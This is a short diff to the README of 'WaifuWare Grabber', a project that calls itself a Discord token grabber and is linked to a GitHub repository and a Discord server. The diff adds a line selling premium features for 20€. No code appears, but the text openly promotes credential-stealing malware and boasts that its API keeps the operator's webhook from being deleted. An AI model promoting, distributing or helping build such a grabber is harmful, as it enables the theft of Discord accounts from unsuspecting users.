@@ -4,7 +4,9 @@
 ##### [Discord](https://discord.gg/8RXbqSFnnz) - [Build](https://github.com/NotFubukIl/DiscordTokenGrabber#Free%20Version%20Installation)
 
 WaifuWare Grabber is a Discord Token Grabber,
-It Works With An API So Your Webhook won't be deleted.
+It Works With An API So Your Webhook won't be deleted. <br>
+<br>
+💎: Premium Features (20€ - Join Discord)
 
 ## Features
 
